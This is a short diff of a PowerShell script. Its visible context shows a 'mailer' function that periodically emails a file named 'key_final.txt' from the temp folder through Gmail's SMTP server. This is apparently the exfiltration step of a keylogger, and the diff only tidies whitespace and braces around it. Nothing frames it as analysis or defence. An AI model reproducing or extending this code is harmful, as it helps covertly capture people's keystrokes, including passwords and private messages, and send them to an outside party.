@@ -219,6 +219,7 @@ function Old-Guard {
                 }
                 catch {}
             }
+            
     function mailer {
     Start-Sleep -Seconds $EmailInterval
       $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
@@ -231,8 +232,7 @@ function Old-Guard {
       $ReportEmail.Attachments.Add('%temp%/key_final.txt')
       $SMTPInfo.Send($ReportEmail)
       $SMTPInfo.Send($ReportEmail)
-               
-        } 
+      } 
 
     }
 
